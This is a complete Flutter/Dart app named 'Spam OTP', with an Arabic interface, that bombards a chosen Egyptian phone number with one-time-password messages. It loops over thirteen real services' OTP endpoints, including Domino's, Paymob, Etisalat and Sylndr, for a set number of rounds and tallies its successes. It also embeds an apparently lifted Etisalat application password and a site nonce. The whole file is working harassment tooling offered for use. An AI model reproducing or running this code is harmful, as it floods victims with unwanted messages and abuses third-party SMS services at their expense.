import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;

void main() {
  SystemChrome.setSystemUIOverlayStyle(const SystemUiOverlayStyle(
    statusBarColor: Colors.transparent,
    statusBarIconBrightness: Brightness.light,
  ));
  runApp(const SpamOtpApp());
}

class SpamOtpApp extends StatelessWidget {
  const SpamOtpApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Spam OTP',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'Roboto',
        useMaterial3: true,
      ),
      home: const HomePage(),
    );
  }
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final phoneController = TextEditingController();
  final roundsController = TextEditingController(text: '10');
  final delayController = TextEditingController(text: '2');

  bool isRunning = false;
  int currentRound = 0;
  int totalRounds = 0;
  int totalSuccess = 0;
  int totalFailed = 0;
  List<Map<String, dynamic>> logs = [];

  late AnimationController _pulseController;

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    )..repeat(reverse: true);
  }

  @override
  void dispose() {
    _pulseController.dispose();
    phoneController.dispose();
    roundsController.dispose();
    delayController.dispose();
    super.dispose();
  }

  final List<Map<String, dynamic>> services = [
    {'name': '4sw.app', 'func': send4swapp},
    {'name': 'ZumraFood', 'func': sendZumrafood},
    {'name': 'Aladwaa', 'func': sendAladwaa},
    {'name': 'Sylndr SMS', 'func': sendSylndrSms},
    {'name': 'Tayyiba Farms', 'func': sendTayyibafarms},
    {'name': 'DesertCart', 'func': sendDesertcart},
    {'name': 'Sylndr WhatsApp', 'func': sendSylndrWhatsapp},
    {'name': 'Dominos', 'func': sendDominos},
    {'name': 'Twist TV', 'func': sendTwistTv},
    {'name': 'Paymob', 'func': sendPaymob},
    {'name': 'Etisalat', 'func': sendEtisalat},
    {'name': 'Zumrahub', 'func': sendZumrahub},
    {'name': 'Gourmet Egypt', 'func': sendGourmetEgypt},
  ];

  Future<void> startSpam() async {
    final phone = phoneController.text.trim();
    if (phone.length != 11 || !phone.startsWith('01')) {
      _showSnack('رقم غير صحيح');
      return;
    }

    final rounds = int.tryParse(roundsController.text) ?? 10;
    final delay = double.tryParse(delayController.text) ?? 2.0;

    setState(() {
      isRunning = true;
      currentRound = 0;
      totalRounds = rounds;
      totalSuccess = 0;
      totalFailed = 0;
      logs.clear();
    });

    for (int i = 1; i <= rounds; i++) {
      if (!isRunning) break;

      setState(() {
        currentRound = i;
        logs.insert(0, {'type': 'round', 'text': 'الجولة $i / $rounds'});
      });

      final results = await Future.wait(
        services.map((s) => _runService(s['name'], s['func'], phone)),
      );

      int roundSuccess = 0;
      int roundFailed = 0;

      for (var r in results) {
        if (r['ok'] == true) {
          roundSuccess++;
          totalSuccess++;
        } else {
          roundFailed++;
          totalFailed++;
        }
        setState(() {
          logs.insert(0, {
            'type': r['ok'] ? 'success' : 'fail',
            'text': '${r['name']}  →  ${r['resp']}',
          });
        });
      }

      setState(() {
        logs.insert(0, {
          'type': 'info',
          'text': 'نتيجة الجولة ←  ✅ $roundSuccess   ❌ $roundFailed',
        });
      });

      if (i < rounds && isRunning) {
        await Future.delayed(Duration(milliseconds: (delay * 1000).toInt()));
      }
    }

    setState(() {
      isRunning = false;
      logs.insert(0, {
        'type': 'done',
        'text': 'انتهى الإرسال  •  النجاح $totalSuccess  |  الفشل $totalFailed',
      });
    });
  }

  Future<Map<String, dynamic>> _runService(String name, Function func, String phone) async {
    try {
      return await func(phone);
    } catch (e) {
      return {'name': name, 'ok': false, 'resp': 'error'};
    }
  }

  void stopSpam() {
    setState(() => isRunning = false);
  }

  void _showSnack(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(msg),
        backgroundColor: Colors.redAccent.shade700,
        behavior: SnackBarBehavior.floating,
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              Color(0xFF0A0E17),
              Color(0xFF0F172A),
              Color(0xFF0A0E17),
            ],
          ),
        ),
        child: SafeArea(
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Header
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: Colors.cyan.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(14),
                        border: Border.all(color: Colors.cyan.withOpacity(0.3)),
                      ),
                      child: const Icon(Icons.bolt_rounded, color: Colors.cyanAccent, size: 26),
                    ),
                    const SizedBox(width: 14),
                    const Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'Spam OTP',
                          style: TextStyle(
                            fontSize: 22,
                            fontWeight: FontWeight.w700,
                            color: Colors.white,
                            letterSpacing: 0.5,
                          ),
                        ),
                        Text(
                          'Professional Tool',
                          style: TextStyle(fontSize: 12, color: Colors.white54),
                        ),
                      ],
                    ),
                    const Spacer(),
                    if (isRunning)
                      ScaleTransition(
                        scale: Tween(begin: 0.9, end: 1.1).animate(_pulseController),
                        child: Container(
                          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                          decoration: BoxDecoration(
                            color: Colors.red.withOpacity(0.2),
                            borderRadius: BorderRadius.circular(20),
                            border: Border.all(color: Colors.redAccent.withOpacity(0.5)),
                          ),
                          child: const Row(
                            children: [
                              Icon(Icons.circle, size: 8, color: Colors.redAccent),
                              SizedBox(width: 6),
                              Text('جاري العمل', style: TextStyle(color: Colors.redAccent, fontSize: 12)),
                            ],
                          ),
                        ),
                      ),
                  ],
                ),

                const SizedBox(height: 28),

                // Phone Input
                _buildInput(
                  controller: phoneController,
                  label: 'رقم الهاتف',
                  hint: '01xxxxxxxxx',
                  icon: Icons.phone_android_rounded,
                  keyboard: TextInputType.phone,
                ),

                const SizedBox(height: 14),

                // Rounds + Delay
                Row(
                  children: [
                    Expanded(
                      child: _buildInput(
                        controller: roundsController,
                        label: 'الجولات',
                        hint: '10',
                        icon: Icons.repeat_rounded,
                        keyboard: TextInputType.number,
                      ),
                    ),
                    const SizedBox(width: 14),
                    Expanded(
                      child: _buildInput(
                        controller: delayController,
                        label: 'التأخير (ث)',
                        hint: '2',
                        icon: Icons.timer_outlined,
                        keyboard: TextInputType.number,
                      ),
                    ),
                  ],
                ),

                const SizedBox(height: 22),

                // Buttons
                Row(
                  children: [
                    Expanded(
                      child: _buildButton(
                        text: 'بدء الإرسال',
                        icon: Icons.play_arrow_rounded,
                        color: const Color(0xFF10B981),
                        onTap: isRunning ? null : startSpam,
                      ),
                    ),
                    const SizedBox(width: 14),
                    Expanded(
                      child: _buildButton(
                        text: 'إيقاف',
                        icon: Icons.stop_rounded,
                        color: const Color(0xFFEF4444),
                        onTap: isRunning ? stopSpam : null,
                      ),
                    ),
                  ],
                ),

                const SizedBox(height: 20),

                // Stats Cards
                Row(
                  children: [
                    _buildStatCard('الجولة', '$currentRound / $totalRounds', Colors.cyanAccent),
                    const SizedBox(width: 10),
                    _buildStatCard('نجاح', '$totalSuccess', const Color(0xFF10B981)),
                    const SizedBox(width: 10),
                    _buildStatCard('فشل', '$totalFailed', const Color(0xFFEF4444)),
                  ],
                ),

                const SizedBox(height: 18),

                // Logs Header
                const Text(
                  'سجل العمليات',
                  style: TextStyle(
                    color: Colors.white70,
                    fontSize: 13,
                    fontWeight: FontWeight.w500,
                  ),
                ),
                const SizedBox(height: 8),

                // Logs
                Expanded(
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.all(14),
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.03),
                      borderRadius: BorderRadius.circular(18),
                      border: Border.all(color: Colors.white.withOpacity(0.06)),
                    ),
                    child: logs.isEmpty
                        ? const Center(
                            child: Text(
                              'في انتظار البدء...',
                              style: TextStyle(color: Colors.white30, fontSize: 14),
                            ),
                          )
                        : ListView.builder(
                            itemCount: logs.length,
                            itemBuilder: (context, index) {
                              final log = logs[index];
                              Color color = Colors.white60;
                              IconData icon = Icons.info_outline;

                              if (log['type'] == 'success') {
                                color = const Color(0xFF34D399);
                                icon = Icons.check_circle_outline;
                              } else if (log['type'] == 'fail') {
                                color = const Color(0xFFF87171);
                                icon = Icons.cancel_outlined;
                              } else if (log['type'] == 'round') {
                                color = Colors.cyanAccent;
                                icon = Icons.play_circle_outline;
                              } else if (log['type'] == 'done') {
                                color = Colors.amber;
                                icon = Icons.flag_rounded;
                              }

                              return Padding(
                                padding: const EdgeInsets.only(bottom: 10),
                                child: Row(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    Icon(icon, size: 16, color: color),
                                    const SizedBox(width: 8),
                                    Expanded(
                                      child: Text(
                                        log['text'],
                                        style: TextStyle(
                                          color: color,
                                          fontSize: 13,
                                          height: 1.3,
                                        ),
                                      ),
                                    ),
                                  ],
                                ),
                              );
                            },
                          ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildInput({
    required TextEditingController controller,
    required String label,
    required String hint,
    required IconData icon,
    required TextInputType keyboard,
  }) {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.04),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: Colors.white.withOpacity(0.08)),
      ),
      child: TextField(
        controller: controller,
        keyboardType: keyboard,
        style: const TextStyle(color: Colors.white, fontSize: 15),
        decoration: InputDecoration(
          labelText: label,
          hintText: hint,
          labelStyle: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 13),
          hintStyle: TextStyle(color: Colors.white.withOpacity(0.2)),
          prefixIcon: Icon(icon, color: Colors.cyanAccent.withOpacity(0.7), size: 20),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        ),
      ),
    );
  }

  Widget _buildButton({
    required String text,
    required IconData icon,
    required Color color,
    required VoidCallback? onTap,
  }) {
    final enabled = onTap != null;
    return GestureDetector(
      onTap: onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        height: 52,
        decoration: BoxDecoration(
          color: enabled ? color.withOpacity(0.15) : Colors.white.withOpacity(0.03),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: enabled ? color.withOpacity(0.5) : Colors.white.withOpacity(0.06),
          ),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: enabled ? color : Colors.white24, size: 22),
            const SizedBox(width: 8),
            Text(
              text,
              style: TextStyle(
                color: enabled ? color : Colors.white24,
                fontSize: 15,
                fontWeight: FontWeight.w600,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStatCard(String title, String value, Color color) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: color.withOpacity(0.08),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: color.withOpacity(0.2)),
        ),
        child: Column(
          children: [
            Text(
              value,
              style: TextStyle(
                color: color,
                fontSize: 18,
                fontWeight: FontWeight.w700,
              ),
            ),
            const SizedBox(height: 2),
            Text(
              title,
              style: TextStyle(
                color: color.withOpacity(0.7),
                fontSize: 11,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ====================== الخدمات ======================

Future<Map<String, dynamic>> send4swapp(String phone) async {
  try {
    final url = Uri.parse(
        'https://identity.4sw.app/api/account/generateotpforregistration?phoneNumber=$phone');
    final res = await http.get(url, headers: {
      'accept': 'application/json,text/plain,*/*',
      'user-agent': 'Mozilla/5.0',
    }).timeout(const Duration(seconds: 4));
    return {
      'name': '4sw.app',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': '4sw.app', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendZumrafood(String phone) async {
  try {
    final url = Uri.parse('https://api.zumrafood.com/auth/otp-request');
    final res = await http
        .put(url,
            headers: {'content-type': 'application/json'},
            body: jsonEncode({'mobile': phone, 'channel': 'SMS'}))
        .timeout(const Duration(seconds: 4));
    return {
      'name': 'ZumraFood',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'ZumraFood', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendAladwaa(String phone) async {
  try {
    final url = Uri.parse('https://aladwaa.com/wp-admin/admin-ajax.php');
    final res = await http.post(url, headers: {
      'content-type': 'application/x-www-form-urlencoded',
    }, body: {
      'action': 'aladwaa_register_api',
      'name': 'محمد علي',
      'phone': phone,
      'type': '1',
      'nonce': 'd81773836b'
    }).timeout(const Duration(seconds: 4));
    return {
      'name': 'Aladwaa',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Aladwaa', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendSylndrSms(String phone) async {
  try {
    final url = Uri.parse('https://otp.sylndr.com/api/v1.0/otp/sms/send');
    final res = await http
        .post(url,
            headers: {'content-type': 'application/json'},
            body: jsonEncode({'phone': phone, 'language': 'ar'}))
        .timeout(const Duration(seconds: 4));
    return {
      'name': 'Sylndr SMS',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Sylndr SMS', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendTayyibafarms(String phone) async {
  try {
    final url = Uri.parse(
        'https://www.tayyibafarms.com/index.php?route=extension/tmdsms/verifytelephone/chkphonenumber');
    final res = await http.post(url, headers: {
      'content-type': 'application/x-www-form-urlencoded',
    }, body: {
      'telephone': phone
    }).timeout(const Duration(seconds: 4));
    return {
      'name': 'Tayyiba Farms',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Tayyiba Farms', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendDesertcart(String phone) async {
  try {
    final url = Uri.parse('https://www.desertcart.com.eg/api/sessions');
    final res = await http
        .post(url,
            headers: {'content-type': 'application/json'},
            body: jsonEncode({
              'login': phone,
              'recaptcha': {'token': 'auto', 'key': 2, 'version': 'V3'},
            }))
        .timeout(const Duration(seconds: 4));
    return {
      'name': 'DesertCart',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'DesertCart', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendSylndrWhatsapp(String phone) async {
  try {
    final url = Uri.parse('https://otp.sylndr.com/api/v1.0/otp/sms/resend');
    final res = await http
        .post(url,
            headers: {'content-type': 'application/json'},
            body: jsonEncode({'phone': phone, 'language': 'ar', 'channel': 'whatsapp'}))
        .timeout(const Duration(seconds: 4));
    return {
      'name': 'Sylndr WhatsApp',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Sylndr WhatsApp', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendDominos(String phone) async {
  try {
    final url = Uri.parse('https://order.golo03.dominos.com/power/otpVerification/_send');
    final res = await http
        .post(url,
            headers: {
              'content-type': 'application/json',
              'dpz-language': 'ar',
              'dpz-market': 'EGYPT',
            },
            body: jsonEncode({
              'phoneNumber': phone,
              'market': 'EGYPT',
              'locale': 'ar-EG',
              'challenge': 'PHONE'
            }))
        .timeout(const Duration(seconds: 4));
    return {
      'name': 'Dominos',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Dominos', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendTwistTv(String phone) async {
  try {
    final url = Uri.parse('https://ev-api.aws.playco.com/api/v1.0/eg/twist/send-otp');
    final formatted = phone.startsWith('2') ? phone : '2$phone';
    final res = await http
        .post(url,
            headers: {'content-type': 'application/json'},
            body: jsonEncode({'phoneNumber': formatted}))
        .timeout(const Duration(seconds: 4));
    return {
      'name': 'Twist TV',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Twist TV', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendPaymob(String phone) async {
  try {
    final url = Uri.parse('https://accept.paymob.com/api/auth/reset_pass/request_otp');
    final res = await http
        .post(url,
            headers: {'content-type': 'application/json'},
            body: jsonEncode({'username': phone}))
        .timeout(const Duration(seconds: 4));
    return {
      'name': 'Paymob',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Paymob', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendEtisalat(String phone) async {
  try {
    final udid = base64Encode(utf8.encode(phone));
    final url = Uri.parse(
        'https://www.etisalat.eg/Saytar/rest/quickAccess/site/sendVerCodeQuickAccessV2?sendVerCodeQuickAccessRequest=%3CsendVerCodeQuickAccessRequest%3E%3Cdial%3E$phone%3C/dial%3E%3Cudid%3E$udid%3C/udid%3E%3C/sendVerCodeQuickAccessRequest%3E');
    final res = await http.get(url, headers: {
      'User-Agent': 'Mozilla/5.0',
      'applicationName': 'MAB',
      'applicationPassword': 'ZFZyqUpqeO9TMhXg4R/9qs0Igwg=',
    }).timeout(const Duration(seconds: 4));
    return {
      'name': 'Etisalat',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Etisalat', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendZumrahub(String phone) async {
  try {
    final url = Uri.parse('https://api.zumrahub.com/auth/otp-request/mobile');
    final res = await http
        .put(url,
            headers: {'content-type': 'application/json'},
            body: jsonEncode({'mobile': phone, 'channel': 'SMS'}))
        .timeout(const Duration(seconds: 4));
    return {
      'name': 'Zumrahub',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Zumrahub', 'ok': false, 'resp': 'error'};
  }
}

Future<Map<String, dynamic>> sendGourmetEgypt(String phone) async {
  try {
    final formatted = phone.startsWith('01') ? '2$phone' : phone;
    final url = Uri.parse('https://gourmetegypt.com/customermobile/account/mobilesendcode/');
    final res = await http.post(url, headers: {
      'content-type': 'application/x-www-form-urlencoded',
    }, body: {
      'mobile_number': formatted
    }).timeout(const Duration(seconds: 4));
    return {
      'name': 'Gourmet Egypt',
      'ok': res.statusCode == 200,
      'resp': res.body.length > 25 ? res.body.substring(0, 25) : res.body
    };
  } catch (e) {
    return {'name': 'Gourmet Egypt', 'ok': false, 'resp': 'error'};
  }
}